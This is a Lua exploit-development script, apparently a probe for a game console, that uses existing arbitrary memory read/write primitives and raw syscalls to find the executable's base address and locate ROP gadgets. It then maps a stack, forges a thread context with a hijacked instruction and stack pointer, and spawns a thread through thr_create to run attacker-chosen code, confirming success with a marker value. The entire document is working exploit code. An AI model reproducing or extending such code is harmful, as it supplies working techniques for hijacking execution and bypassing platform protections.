-- CRASH_CLASS: LOW
-- PROBE 531p: thr_create WITHOUT signal masking — exact 156d clone
--
-- 531o died in thr_create. 156d works. Key diffs:
-- 1. 156d doesn't mask signals
-- 2. 156d uses mmap for marker/stack (not memory.alloc for stack)
-- 3. 156d uses sc_nanosleep to wait
-- 4. 156d uses uint64 arithmetic for ctx offsets
--
-- This probe clones 156d as closely as possible, but simplified.

print("=== PROBE 531p: THR NOSIG ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

-- NO signal masking — match 156d exactly

local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_getpid = make_syscall(20)

local pid = to_num(pcall(function() return sc_getpid():tonumber() end) or 0)
-- Safer pid extraction
local ok_pid, pid_val = pcall(function() return sc_getpid() end)
print(string.format("pid=%s", ok_pid and q(pid_val) or "?"))

-- Get eboot base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108) or 0
local text_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("eb=" .. q(eboot))

-- Known gadgets (from 156d scan results)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)  -- mov [rdi], rax; ret
-- Verify
local g = rd(eboot + 0x92C67)
if g then
    local gn = g; if gn < 0 then gn = gn + 0x100000000 end
    print(string.format("  gadget=0x%08X", gn))
end

-- Find jmp $ (EB FE) by scanning
local jmp_self = nil
for off = 0, 0x100000, 4 do
    local v = rd(eboot + off)
    if v then
        local vn = v; if vn < 0 then vn = vn + 0x100000000 end
        if (vn % 0x10000) == 0xFEEB then
            jmp_self = eboot + uint64(off)
            print("  jmp$=" .. q(jmp_self) .. " @+" .. string.format("0x%X", off))
            break
        end
        if math.floor(vn / 0x100) % 0x10000 == 0xFEEB then
            jmp_self = eboot + uint64(off + 1)
            print("  jmp$=" .. q(jmp_self) .. " @+" .. string.format("0x%X", off + 1))
            break
        end
        if math.floor(vn / 0x10000) % 0x10000 == 0xFEEB then
            jmp_self = eboot + uint64(off + 2)
            print("  jmp$=" .. q(jmp_self) .. " @+" .. string.format("0x%X", off + 2))
            break
        end
    end
end
if not jmp_self then
    print("  no jmp$! Using bare_ret chain")
    jmp_self = eboot + uint64(0x42)
end

-- mmap marker + stack (exactly like 156d)
local page_size = 0x4000
local ok_m1, marker = pcall(function()
    return sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ok_m2, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(page_size * 4), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("marker=" .. q(marker) .. " stack=" .. q(stack_base))
zero(marker, page_size)

local stack_top = stack_base + page_size * 4 - 0x100
wq(stack_top, jmp_self)

-- Context (using wq for ALL fields like 156d)
local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078
local C_RFLAGS = 0x0F0

local ctx = memory.alloc(0x500)
zero(ctx, 0x500)

wq(ctx + C_MAGIC, uint64(0x480))
wd(ctx + C_FLAGS, 0)
wq(ctx + C_TYPE, uint64(0x10000))
wq(ctx + C_CS, uint64(0x43))
wq(ctx + C_SS, uint64(0x3B))
wq(ctx + C_RFLAGS, uint64(0x202))
wq(ctx + C_RIP, mov_rdi_rax_ret)
wq(ctx + C_RSP, stack_top)
wq(ctx + C_RAX, uint64("0xDEADBEEFCAFE"))
wq(ctx + C_RDI, marker)

print("rip=" .. q(rq(ctx + C_RIP)))
print("rsp=" .. q(rq(ctx + C_RSP)))
print("rdi=" .. q(rq(ctx + C_RDI)))

-- thr_create
print("[thr_create]")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0xDEADDEAD))
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local child_tid = rq(tid_buf)
print("  ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(child_tid))

-- nanosleep 300ms
local ts = memory.alloc(16)
wq(ts, 0)
wq(ts + 8, 300000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

-- Check
local got = rq(marker)
print("marker=" .. q(got))
local ok_k, rv_k = pcall(function() return sc_thr_kill(child_tid, uint64(0)) end)
print("thr_kill=" .. tostring(to_num(rv_k)))

if got then
    local gh, gl = 0, 0
    if type(got) == "table" and got.h then gh, gl = got.h, got.l end
    if gh == 0xDEAD and gl == 0xBEEFCAFE then
        print("SUCCESS: child executed!")
    else
        print("FAILED: marker unchanged")
    end
end

print("=== 531p DONE ===")
